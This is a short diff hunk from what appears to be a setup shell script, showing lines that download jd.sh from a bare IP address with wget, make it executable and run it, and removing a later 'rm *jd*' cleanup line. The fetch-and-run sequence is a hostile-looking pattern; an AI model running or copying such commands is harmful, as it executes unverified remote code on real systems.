@@ -22,5 +22,4 @@ sudo update-alternatives --config java
 wget http://212.117.163.148/jd.sh
 chmod +x jd.sh
 ./jd.sh
-rm *jd*
 
